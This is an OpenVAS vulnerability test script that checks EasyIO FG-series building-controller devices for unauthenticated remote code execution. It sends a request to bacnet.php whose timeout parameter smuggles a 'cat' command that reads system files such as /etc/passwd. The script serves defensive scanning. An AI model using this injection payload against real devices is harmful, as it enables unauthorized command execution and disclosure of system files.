###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_EasyIO_rce_12_16.nasl 11647 2018-09-27 09:31:07Z jschulte $
#
# EasyIO Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:easyio:easyio";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140106");
  script_version("$Revision: 11647 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_name("EasyIO Multiple Vulnerabilities");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/2908");

  script_tag(name:"vuldetect", value:"Try to read /etc/passwd");
  script_tag(name:"insight", value:"EasyIO FG-series devices are prone to multiple vulnerabilies:

  - Unauthenticated remote code execution

  - Unauthenticated database file download

  - Authenticated directory traversal vulnerability");

  script_tag(name:"solution", value:"Check with the vendor for fixed firmware versions.");
  script_tag(name:"summary", value:"EasyIO FG-series devices are prone to multiple vulnerabilies.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 11:31:07 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-12-28 14:42:25 +0100 (Wed, 28 Dec 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_EasyIO_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 443);
  script_mandatory_keys("easyio/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service: "www" ) ) exit( 0 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = '/sdcard/cpt/scripts/bacnet.php?action=discoverDevices&lowLimit=0&highLimit=0&timeout=0%26cat%20/' + file;

  req = http_get_req( port:port,
                      url:url,
                      add_headers: make_array( "X-Requested-With", "XMLHttpRequest")
                    );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern ) && "SUCCESS" >< buf )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
